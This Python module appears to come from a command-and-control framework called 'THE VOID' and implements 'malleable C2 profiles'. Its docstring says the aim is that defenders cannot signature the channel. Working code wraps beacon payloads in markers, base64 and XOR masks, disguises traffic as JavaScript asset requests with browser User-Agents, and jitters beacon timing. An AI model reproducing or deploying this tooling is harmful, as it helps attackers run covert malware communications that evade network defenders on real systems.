"""THE VOID — Malleable C2 profiles.

A profile describes *how C2 traffic looks on the wire* so defenders cannot
signature one fixed channel: message framing (prepends/appends, base64,
XOR mask), HTTP shape (verbs, URI templates, headers, allowed response
codes), and timing (sleep/jitter between beacons).

Every transform is **reversible** — the receiving end applies
:meth:`Profile.unwrap` after the sender applied :meth:`Profile.wrap`.
Profiles serialize to JSON (load/save/dict) and validate their own shape;
built-in profiles ship with the client.

Framing caveat (documented, enforced by tests): transforms are applied
innermost-first and undone outermost-first. prepends/appends are stripped
by fixed length; base64 and xor-mask layers are order-sensitive in wrap
and must be unwrapped in exact reverse order — :meth:`unwrap` handles it.
"""

from __future__ import annotations

import base64
import copy
import json
import logging
import random
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("void.c2.profiles")

PROFILE_VERSION = 1

# Allowed transform names (validated on load).
KNOWN_TRANSFORMS = ("prepend", "append", "base64", "xor-mask")

# Allowed HTTP verbs for request shaping.
KNOWN_METHODS = ("GET", "POST", "PUT", "PATCH")


class ProfileError(Exception):
    """Raised for malformed or unsupported profile definitions."""


class Profile:
    """A malleable C2 traffic profile."""

    def __init__(
        self,
        name: str,
        transforms: Optional[List[Dict[str, Any]]] = None,
        method: str = "POST",
        uri: str = "/api/v{nonce}",
        headers: Optional[Dict[str, str]] = None,
        allowed_status: Optional[List[int]] = None,
        sleep: float = 30.0,
        jitter: float = 0.2,
        watermark: str = "",
        version: int = PROFILE_VERSION,
    ):
        self.name = name
        self.transforms: List[Dict[str, Any]] = copy.deepcopy(transforms or [])
        self.method = method.upper()
        self.uri = uri
        self.headers = dict(headers or {})
        self.allowed_status = list(allowed_status or [200, 204])
        self.sleep = float(sleep)
        self.jitter = float(jitter)
        self.watermark = watermark
        self.version = int(version)
        self.validate()

    # ─── Validation / (de)serialization ──────────────────────────────────────

    def validate(self) -> None:
        if not self.name:
            raise ProfileError("profile name must be non-empty")
        if self.method not in KNOWN_METHODS:
            raise ProfileError(f"unsupported HTTP method {self.method!r}")
        if not self.uri:
            raise ProfileError("profile uri must be non-empty")
        if not 0.0 <= self.jitter <= 1.0:
            raise ProfileError(f"profile jitter must be in [0, 1], got {self.jitter}")
        if self.sleep < 0:
            raise ProfileError(f"profile sleep must be >= 0, got {self.sleep}")
        for status in self.allowed_status:
            if not isinstance(status, int) or not 100 <= status <= 599:
                raise ProfileError(f"invalid allowed status {status!r}")
        for step in self.transforms:
            self._validate_step(step)

    @staticmethod
    def _validate_step(step: Dict[str, Any]) -> None:
        kind = step.get("type", "")
        if kind not in KNOWN_TRANSFORMS:
            raise ProfileError(f"unknown transform {kind!r}")
        if kind in ("prepend", "append") and not isinstance(step.get("value", ""), str):
            raise ProfileError(f"{kind} transform requires a string 'value'")
        if kind == "xor-mask":
            mask = step.get("key", "")
            if not isinstance(mask, str) or not mask:
                raise ProfileError("xor-mask transform requires a non-empty 'key'")

    def to_dict(self) -> Dict[str, Any]:
        return {
            "version": self.version,
            "name": self.name,
            "transforms": copy.deepcopy(self.transforms),
            "method": self.method,
            "uri": self.uri,
            "headers": dict(self.headers),
            "allowed_status": list(self.allowed_status),
            "sleep": self.sleep,
            "jitter": self.jitter,
            "watermark": self.watermark,
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "Profile":
        if not isinstance(data, dict):
            raise ProfileError("profile must be a mapping")
        version = int(data.get("version", PROFILE_VERSION))
        if version > PROFILE_VERSION:
            raise ProfileError(f"unsupported profile version {version}")
        return cls(
            name=data.get("name", ""),
            transforms=data.get("transforms", []),
            method=data.get("method", "POST"),
            uri=data.get("uri", "/api/v{nonce}"),
            headers=data.get("headers", {}),
            allowed_status=data.get("allowed_status", [200, 204]),
            sleep=data.get("sleep", 30.0),
            jitter=data.get("jitter", 0.2),
            watermark=data.get("watermark", ""),
            version=version,
        )

    def save(self, path: str) -> None:
        p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(self.to_dict(), indent=2))

    @classmethod
    def load(cls, path: str) -> "Profile":
        try:
            data = json.loads(Path(path).read_text())
        except (OSError, json.JSONDecodeError) as exc:
            raise ProfileError(f"cannot load profile {path}: {exc}") from exc
        return cls.from_dict(data)

    # ─── Payload transforms (wrap / unwrap) ─────────────────────────────────

    def wrap(self, payload: bytes) -> bytes:
        """Apply transforms in order (first listed is applied first)."""
        data = payload
        for step in self.transforms:
            data = self._apply(step, data)
        return data

    def unwrap(self, data: bytes) -> bytes:
        """Invert transforms in exact reverse order."""
        out = data
        for step in reversed(self.transforms):
            out = self._invert(step, out)
        return out

    @staticmethod
    def _apply(step: Dict[str, Any], data: bytes) -> bytes:
        kind = step["type"]
        if kind == "prepend":
            return step["value"].encode("utf-8") + data
        if kind == "append":
            return data + step["value"].encode("utf-8")
        if kind == "base64":
            return base64.b64encode(data)
        if kind == "xor-mask":
            return Profile._xor(data, step["key"].encode("utf-8"))
        raise ProfileError(f"unknown transform {kind!r}")

    @staticmethod
    def _invert(step: Dict[str, Any], data: bytes) -> bytes:
        kind = step["type"]
        if kind == "prepend":
            n = len(step["value"].encode("utf-8"))
            if not data.startswith(step["value"].encode("utf-8")):
                raise ProfileError("unwrap failed: prepend marker missing")
            return data[n:]
        if kind == "append":
            n = len(step["value"].encode("utf-8"))
            if not data.endswith(step["value"].encode("utf-8")):
                raise ProfileError("unwrap failed: append marker missing")
            return data[: len(data) - n] if n else data
        if kind == "base64":
            return base64.b64decode(data)
        if kind == "xor-mask":
            return Profile._xor(data, step["key"].encode("utf-8"))
        raise ProfileError(f"unknown transform {kind!r}")

    @staticmethod
    def _xor(data: bytes, key: bytes) -> bytes:
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    # ─── HTTP shaping ────────────────────────────────────────────────────────

    def render_request(self, body: bytes, nonce: str = "") -> Dict[str, Any]:
        """Build the shaped HTTP request descriptor for a wrapped body.

        Returns a plain dict (method, url, headers, body) so transports can
        hand it to any HTTP client without coupling to requests/httpx.
        """
        uri = self.uri.replace("{nonce}", nonce or str(random.randint(1000, 9999)))
        headers = dict(self.headers)
        headers.setdefault("Content-Type", "application/octet-stream")
        if self.watermark:
            headers.setdefault("X-Request-Id", self.watermark)
        return {
            "method": self.method,
            "url": uri,
            "headers": headers,
            "body": body,
        }

    def parse_response(self, status: int, body: bytes) -> bytes:
        """Validate a shaped response and return its unwrapped payload."""
        if status not in self.allowed_status:
            raise ProfileError(
                f"unexpected response status {status} (allowed {self.allowed_status})"
            )
        return self.unwrap(body)

    # ─── Timing ──────────────────────────────────────────────────────────────

    def next_sleep(self) -> float:
        """Sleep interval with jitter applied (never negative)."""
        if self.jitter <= 0:
            return max(0.0, self.sleep)
        factor = 1 + random.uniform(-self.jitter, self.jitter)
        return max(0.0, self.sleep * factor)


# ─── Built-in profiles ────────────────────────────────────────────────────────

def _http_beacon() -> Profile:
    return Profile(
        name="http-beacon",
        transforms=[
            {"type": "prepend", "value": "V1::"},
            {"type": "base64"},
            {"type": "append", "value": "::END"},
        ],
        method="POST",
        uri="/api/v{nonce}",
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) VoidBeacon"},
        allowed_status=[200, 202, 204],
        sleep=30.0,
        jitter=0.2,
        watermark="wb-1",
    )


def _https_mimic() -> Profile:
    return Profile(
        name="https-mimic",
        transforms=[
            {"type": "xor-mask", "key": "void-shared-mask"},
            {"type": "base64"},
        ],
        method="GET",
        uri="/assets/{nonce}.js",
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        allowed_status=[200, 304],
        sleep=60.0,
        jitter=0.35,
        watermark="wb-2",
    )


BUILTIN_PROFILES: Dict[str, Profile] = {
    p.name: p for p in (_http_beacon(), _https_mimic())
}


def builtin(name: str) -> Profile:
    """Return a copy of a built-in profile (mutating the copy is safe)."""
    try:
        return copy.deepcopy(BUILTIN_PROFILES[name])
    except KeyError:
        raise ProfileError(
            f"no built-in profile named {name!r} "
            f"(available: {sorted(BUILTIN_PROFILES)})"
        ) from None


def validate_profile(data: Dict[str, Any]) -> Profile:
    """Validate a profile dict and return the constructed Profile."""
    return Profile.from_dict(data)
